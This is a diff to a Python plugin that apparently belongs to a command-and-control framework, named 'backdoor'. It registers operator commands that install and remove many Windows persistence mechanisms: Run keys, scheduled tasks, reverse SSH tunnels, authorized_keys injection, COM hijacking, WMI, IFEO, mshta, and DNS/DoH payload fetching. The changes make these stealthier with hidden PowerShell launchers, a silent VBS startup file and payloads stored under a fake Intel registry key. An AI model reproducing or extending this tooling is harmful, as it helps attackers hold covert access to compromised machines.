@@ -6,6 +6,7 @@
   backdoor paths | priv | status       BOF
   backdoor check <id>                  BOF
   backdoor apply <id> [a] [b]          BOF — ONE id, ONE Demon (Coffee)
+  backdoor clean <id>|all              BOF — remove persist (sshd/WinRM stay)
 
 Inbound 10.66.0.0/24 only. Never WAN 22/5985. Keys = file.
 HMAC / signed URLs live in dropped Intel\\PowerManager files, not schtask /tr.
@@ -41,9 +42,10 @@ BD_HELP = """backdoor — recovery. Overlay / outbound first. ONE Coffee BOF per
   paths | priv | status    BOF
   check <id>               BOF
   apply <id> [a] [b]       BOF  (explicit — never 10 at once)
+  clean <id>|all           BOF  sshd/WinRM stay; sshkey needs needle
 
 apply
-  wake [url]               curl file + HKCU Run + ONLOGON
+  wake [url]               payload in HKCU, hidden powershell (no cmd window)
   ssh [user@host] [Rspec]  ssh.exe -R persist  default root@10.66.0.1  2201:127.0.0.1:3389
   sshkey [pubkey]          USERPROFILE\\.ssh\\authorized_keys APPEND
   knock listen|send [sec]  SPA HMAC-SHA256 UDP 62201, fw 10.66.0.0/24 (not WoL)
@@ -53,7 +55,7 @@ apply
   com [url]                COM-Hunter LocalServer32 MsCtfMonitor+CacheTask
   treatas [url]            COM-Hunter TreatAs -> our CLSID
   logon [url]              T1037 UserInitMprLogonScript
-  startup [url]            PersistBOF Startup\\IpmaUpdate.cmd
+  startup [url]            PersistBOF Startup\\IpmaUpdate.vbs (silent)
   profile [url]            T1546.013 PowerShell profile
   active [url]             T1547.014 Active Setup
   autorun [url]            cmd AutoRun
@@ -68,31 +70,45 @@ apply
 
 BD_LIST = """id       priv     apply                                src
 -------- -------- ------------------------------------ ----------------
+
 wake     Medium   curl file + Run + ONLOGON            T1053+T1547
 ssh      Medium   ssh.exe -R persist                   T1021.004
 sshkey   Medium   authorized_keys APPEND               T1098.004
 knock    Medium   SPA HMAC UDP :62201 persist          fwknop-class
+
 dns      Medium   TXT parse + curl 30m                 T1071.004
 doh      Medium   DoH Cloudflare TXT                   T1572
 bits     Medium   T1197 + NotifyCmdLine                T1197
+mshta    Medium   signed CDN .hta                      T1218.005
+
 com      Medium   MsCtfMonitor+CacheTask LocalServer32 COM-Hunter
 treatas  Medium   TreatAs -> our CLSID                 COM-Hunter
 logon    Medium   T1037 logon script                   T1037.001
-startup  Medium   Startup\\\\IpmaUpdate.cmd             PersistBOF
+startup  Medium   Startup\\IpmaUpdate.vbs (silent)     PersistBOF
 profile  Medium   PowerShell profile                   T1546.013
 active   Medium   Active Setup                         T1547.014
 autorun  Medium   cmd AutoRun                          T1546.001
-mshta    Medium   signed CDN .hta                      T1218.005
+
 winrm    High     5985 fw 10.66.0.0/24                 T1021.006
-proxy    Admin    PortProxy registry                   addportproxy-bof
+proxy    Admin    PortProxy 127.0.0.1:2200 -> :22      addportproxy-bof
 wmi      Admin    explorer.exe start = wake            WMIPersistKit
-time     SYSTEM   Time Provider existing DLL           PersistBOF
 sshd     High     OpenSSH + fw overlay                 T1133
 ifeo     High     SilentProcessExit WerFault           T1546.012
+time     SYSTEM   Time Provider existing DLL           PersistBOF
+
+clean <id>|all    remove persist. sshd/WinRM stay.
 """
 
 BD_TOPICS = {
-    "help": "help backdoor\nhelp backdoor apply\nbackdoor help [apply|wake|ssh|sshkey|knock|list]",
+    "help": "help backdoor\nhelp backdoor apply\nhelp backdoor clean\nbackdoor help [apply|clean|list]",
+    "clean": (
+        "backdoor clean <id>|all\n"
+        "  ONE Coffee BOF. Removes files/Run/tasks/fw/COM/WMI we planted.\n"
+        "  sshd + WinRM services stay (fw overlay rule only).\n"
+        "  sshkey: backdoor clean sshkey <needle>  — never wipe whole authorized_keys\n"
+        "  ex: backdoor clean wake\n"
+        "      backdoor clean all"
+    ),
     "list": BD_LIST,
     "paths": "backdoor paths\n  Hunt LOLBins + .ssh (BOF). One Coffee on this Demon.",
     "priv": "backdoor priv\n  Token IL + privileges (BOF).",
@@ -112,7 +128,7 @@ BD_TOPICS = {
         "  ex: backdoor apply wake\n"
         "      backdoor apply knock listen"
     ),
-    "wake": "backdoor apply wake [url]\n  curl file + HKCU Run + ONLOGON. HMAC in ipma-upd.cmd.",
+    "wake": "backdoor apply wake [url]\n  payload in HKCU Software\\Intel\\PowerManager\\Data + hidden powershell launcher.",
     "ssh": "backdoor apply ssh [user@host] [Rspec]\n  ssh.exe -R persist. default root@10.66.0.1  2201:127.0.0.1:3389",
     "sshkey": "backdoor apply sshkey [pubkey]\n  APPEND USERPROFILE\\.ssh\\authorized_keys. Administrators also need ProgramData.",
     "knock": "backdoor apply knock listen|send [secret]\n  SPA HMAC-SHA256 UDP 62201, fw 10.66.0.0/24. not WoL.",
@@ -203,6 +219,13 @@ def _note(demon, msg):
     demon.ConsoleWrite(demon.CONSOLE_INFO, msg)
 
 
+def _info_lines(demonID, text):
+    demon = Demon(demonID)
+    for line in str(text).splitlines():
+        demon.ConsoleWrite(demon.CONSOLE_INFO, line if line else " ")
+    return True
+
+
 def _fire5(demonID, c0, c1, c2, c3, c4, label):
     demon = Demon(demonID)
     local = _obj_local()
@@ -241,26 +264,25 @@ def backdoor_root(demonID, *param):
         return backdoor_check(demonID, *rest)
     if sub == "apply":
         return backdoor_apply(demonID, *rest)
+    if sub in ("clean", "clear", "rm"):
+        return backdoor_clean(demonID, *rest)
     if sub in METHODS:
         return _fire5(demonID, "check", sub, "", "", "", "backdoor check %s" % sub)
     return backdoor_help(demonID)
 
 
 def backdoor_help(demonID, *param):
-    demon = Demon(demonID)
     key = ""
     if param:
         key = str(param[0]).lower().lstrip("-")
         if key in ("h", "help"):
             key = ""
     text = BD_TOPICS.get(key) or BD_HELP
-    demon.ConsoleWrite(demon.CONSOLE_INFO, text)
-    return True
+    return _info_lines(demonID, text)
 
 
 def backdoor_list(demonID, *param):
-    Demon(demonID).ConsoleWrite(Demon(demonID).CONSOLE_INFO, BD_LIST)
-    return True
+    return _info_lines(demonID, BD_LIST)
 
 
 def backdoor_paths(demonID, *param):
@@ -311,23 +333,36 @@ def backdoor_apply(demonID, *param):
     return _fire5(demonID, "apply", mid, a, b, extra, label)
 
 
+def backdoor_clean(demonID, *param):
+    if not param:
+        return backdoor_help(demonID, "clean")
+    mid = str(param[0]).lower()
+    extra = str(param[1]) if len(param) > 1 else ""
+    if mid in ("spa", "magic"):
+        mid = "knock"
+    if mid == "sshkey" and not extra:
+        extra = _ania_pub()
+    return _fire5(demonID, "clean", mid, extra, "", "", "backdoor clean %s" % mid)
+
+
 RegisterModule(
     "backdoor",
     "APT recovery. Overlay/outbound. ONE Coffee BOF per Demon",
     "API Only",
-    "help|list|paths|priv|status|check <id>|apply <id> [a] [b]  |  help backdoor",
+    "help|list|paths|priv|status|check|apply <id>|clean <id>|clean all  |  help backdoor",
     "help",
     "",
 )
 
-RegisterCommand(backdoor_root, "", "backdoor", "Recovery. Sub: help|list|paths|priv|status|check|apply", 0, "help | list | paths | priv | status | check <id> | apply <id> [a] [b]", "help")
-RegisterCommand(backdoor_help, "backdoor", "help", "Local usage. Never InlineExecute. help backdoor", 0, "[apply|wake|ssh|sshkey|knock]", "apply")
+RegisterCommand(backdoor_root, "", "backdoor", "Recovery. Sub: help|list|paths|priv|status|check|apply|clean", 0, "help | list | paths | priv | status | check <id> | apply <id> [a] [b] | clean <id>|all", "help")
+RegisterCommand(backdoor_help, "backdoor", "help", "Local usage. Never InlineExecute. help backdoor", 0, "[apply|clean|wake|ssh|sshkey|knock]", "apply")
 RegisterCommand(backdoor_list, "backdoor", "list", "Local method table. Never InlineExecute", 0, "", "")
 RegisterCommand(backdoor_paths, "backdoor", "paths", "Hunt LOLBins + .ssh (BOF)", 0, "", "")
 RegisterCommand(backdoor_priv, "backdoor", "priv", "Token IL + privs (BOF)", 0, "", "")
 RegisterCommand(backdoor_status, "backdoor", "status", "Services + paths (BOF)", 0, "", "")
 RegisterCommand(backdoor_check, "backdoor", "check", "Can this id run? (BOF)", 0, "<id>", "ssh")
 RegisterCommand(backdoor_apply, "backdoor", "apply", "ONE id. wake/ssh/sshkey/knock/dns/doh/bits/com/treatas/logon/startup/profile/active/autorun/mshta/winrm/proxy/wmi/time/sshd/ifeo", 0, "<id> [a] [b]", "wake")
+RegisterCommand(backdoor_clean, "backdoor", "clean", "Remove persist. clean <id>|all. sshd/WinRM stay. sshkey needs needle", 0, "<id>|all", "wake")
 
 try:
     open("/tmp/backdoor-gui-loaded", "w").write("backdoor.py loaded kit=%s\n" % _kit_dir())
